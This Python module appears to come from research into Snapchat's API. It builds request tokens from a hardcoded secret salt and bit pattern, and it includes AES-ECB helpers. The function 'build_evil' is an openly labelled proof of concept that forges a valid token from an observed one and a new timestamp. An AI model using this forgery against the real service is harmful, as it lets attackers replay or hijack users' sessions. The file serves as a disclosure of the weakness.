from hashlib import sha256
import time
from Crypto.Cipher import AES

def build_token(server_token, timestamp, secret="iEk21fuwZApXlz93750dmW22pw389dPwOk",
        pattern="0001110111101110001111010101111011010001001110011000110001000110"):
    """
    Standard method to build a token for a request to snapchat
    @server_token the auth_token given on login
    @timestamp the timestamp string of the current request
    @secret snapchat's 'secret' salt
    @pattern snapchat's pattern for selecting from the two hashes
    """
    #build hashes
    sha = sha256()
    sha.update(secret + server_token)
    hash0 = sha.hexdigest()
    sha = sha256()
    sha.update(timestamp + secret)
    hash1 = sha.hexdigest()

    # zip
    output = [hash0[i] if pattern[i] == '0' else hash1[i] for i in range(len(hash0))]
    return ''.join(output)

def build_evil(original, timestamp, secret="iEk21fuwZApXlz93750dmW22pw389dPwOk",
        pattern="0001110111101110001111010101111011010001001110011000110001000110"):
    """
    Proof of concept to generate a new token from an observed token and a new timestamp
    """
    sha = sha256()
    sha.update(timestamp + secret)
    hash1 = sha.hexdigest()

    output = [original[i] if pattern[i] == '0' else hash1[i] for i in range(len(original))]
    return ''.join(output)

def ecb_encrypt(data, key):
        length = 16 - (len(data) % 16)
        data += chr(length) * length
        crypt = AES.new(key, AES.MODE_ECB)
        return crypt.encrypt(data)

def ecb_decrypt(data, key):
        crypt = AES.new(key, AES.MODE_ECB)
        result = bytes(crypt.decrypt(data))

        # remove padding
        result = result[:-ord(result[-1])]

        return result

def timestamp():
    """
    Get the current time in timestamp form
    """
    return str(int(time.time() * 100))
